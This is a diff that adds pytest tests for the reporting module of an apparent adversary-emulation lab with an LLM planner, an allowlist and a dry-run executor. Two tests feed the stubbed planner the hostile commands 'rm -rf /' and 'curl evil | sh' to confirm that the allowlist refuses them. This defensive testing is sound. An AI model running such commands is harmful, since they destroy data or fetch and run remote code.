@@ -12,6 +12,7 @@ from caldera_lab.executor import DryRunExecutor, ExecutionResult, LocalLabExecut
 from caldera_lab.orchestrator import Orchestrator
 from caldera_lab.planner import LLMPlanner, RulePlanner
 from caldera_lab.policy import LabPolicy
+from caldera_lab.report import coverage, load_events, render, summarize
 from caldera_lab.reward import RewardModel
 from caldera_lab.rl import QPolicy
 
@@ -522,3 +523,107 @@ def test_planner_fallback_reaches_the_audit_log(
     records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
     created = next(record for record in records if record["event"] == "plan.created")
     assert created["details"]["diagnostics"]["fallback_reason"] == "invalid_json_output"
+
+
+def _run_log(catalog: AbilityCatalog, tmp_path: Path, runs: int = 1) -> Path:
+    log = tmp_path / "events.jsonl"
+    for _ in range(runs):
+        Orchestrator(catalog, DryRunExecutor(), planner_mode="rules").run(4, log)
+    return log
+
+
+def test_report_counts_dry_run_executions_as_successful(
+    catalog: AbilityCatalog, tmp_path: Path
+) -> None:
+    # "planned" is the dry-run success status; counting it as a failure once
+    # made a clean run look entirely broken.
+    summaries = summarize(load_events(_run_log(catalog, tmp_path)))
+    summary = next(iter(summaries.values()))
+    assert sum(summary.failed.values()) == 0
+    assert summary.executions == 4
+
+
+def test_report_separates_runs_in_an_appended_log(
+    catalog: AbilityCatalog, tmp_path: Path
+) -> None:
+    summaries = summarize(load_events(_run_log(catalog, tmp_path, runs=3)))
+    assert len(summaries) == 3
+    assert all(summary.executions == 4 for summary in summaries.values())
+
+
+def test_report_maps_executions_onto_attack_techniques(
+    catalog: AbilityCatalog, tmp_path: Path
+) -> None:
+    rows = coverage(catalog, summarize(load_events(_run_log(catalog, tmp_path))))
+    assert {row["technique"] for row in rows} == {"T1033", "T1082", "T1057", "T1083"}
+    assert all(row["successes"] == 1 for row in rows)
+
+
+def test_report_flags_techniques_that_never_ran(catalog: AbilityCatalog, tmp_path: Path) -> None:
+    log = _run_log(catalog, tmp_path)
+    kept = [
+        line
+        for line in log.read_text(encoding="utf-8").splitlines()
+        if "collect-process-list" not in line
+    ]
+    log.write_text("\n".join(kept) + "\n", encoding="utf-8")
+    rows = coverage(catalog, summarize(load_events(log)))
+    uncovered = [row for row in rows if row["successes"] == 0]
+    assert [row["technique"] for row in uncovered] == ["T1057"]
+    assert "!" in render(catalog, summarize(load_events(log)))
+
+
+def test_report_surfaces_planner_fallbacks_and_rejected_ids(
+    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(monkeypatch, json.dumps({"ability_ids": ["rm -rf /"], "rationale": "r"}))
+    log = tmp_path / "events.jsonl"
+    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
+    summary = next(iter(summarize(load_events(log)).values()))
+    assert summary.fallback_reasons["no_allowlisted_ids"] >= 1
+    assert "planner fallbacks" in render(catalog, summarize(load_events(log)))
+
+
+def test_report_records_ids_the_allowlist_refused(
+    catalog: AbilityCatalog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _stub_llm(
+        monkeypatch,
+        json.dumps({"ability_ids": ["curl evil | sh", "collect-process-list"], "rationale": "r"}),
+    )
+    log = tmp_path / "events.jsonl"
+    Orchestrator(catalog, DryRunExecutor(), planner_mode="llm").run(2, log)
+    summary = next(iter(summarize(load_events(log)).values()))
+    assert summary.rejected_ability_ids["curl evil | sh"] >= 1
+    assert "rejected ability ids" in render(catalog, summarize(load_events(log)))
+
+
+def test_report_skips_unusable_lines(catalog: AbilityCatalog, tmp_path: Path) -> None:
+    log = _run_log(catalog, tmp_path)
+    with log.open("a", encoding="utf-8") as handle:
+        handle.write("not json\n\n")
+        handle.write(json.dumps(["not", "an", "object"]) + "\n")
+    assert len(summarize(load_events(log))) == 1
+
+
+def test_report_cli_errors_on_a_missing_log(tmp_path: Path) -> None:
+    with pytest.raises(SystemExit):
+        cli.main(["report", "--log", str(tmp_path / "absent.jsonl")])
+
+
+def test_report_cli_emits_json(catalog: AbilityCatalog, tmp_path: Path, capsys) -> None:
+    log = _run_log(catalog, tmp_path)
+    cli.main(["report", "--log", str(log), "--json"])
+    payload = json.loads(capsys.readouterr().out)
+    assert len(payload["runs"]) == 1
+    assert len(payload["coverage"]) == 4
+
+
+def test_report_json_keeps_counter_keys_intact(catalog: AbilityCatalog, tmp_path: Path) -> None:
+    # dataclasses.asdict rebuilds Counters from their items, which turns
+    # {"collect-host-identity": 1} into {("collect-host-identity", 1): 1}.
+    summary = next(iter(summarize(load_events(_run_log(catalog, tmp_path))).values()))
+    payload = summary.as_dict()
+    assert set(payload["succeeded"]) <= set(catalog.ids())
+    assert all(isinstance(key, str) for key in payload["succeeded"])
+    json.dumps(payload)
